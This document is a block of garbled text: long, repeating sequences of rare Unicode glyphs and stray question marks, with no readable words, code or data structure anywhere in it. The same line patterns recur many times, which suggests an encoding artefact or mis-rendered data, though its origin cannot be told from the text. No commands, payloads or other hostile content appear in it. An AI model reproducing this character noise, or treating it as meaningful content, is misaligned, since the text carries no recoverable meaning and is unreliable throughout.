࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛𞋬𞋬𞋬𞋬??࡛࡛࡙࡙࡙࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬??࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬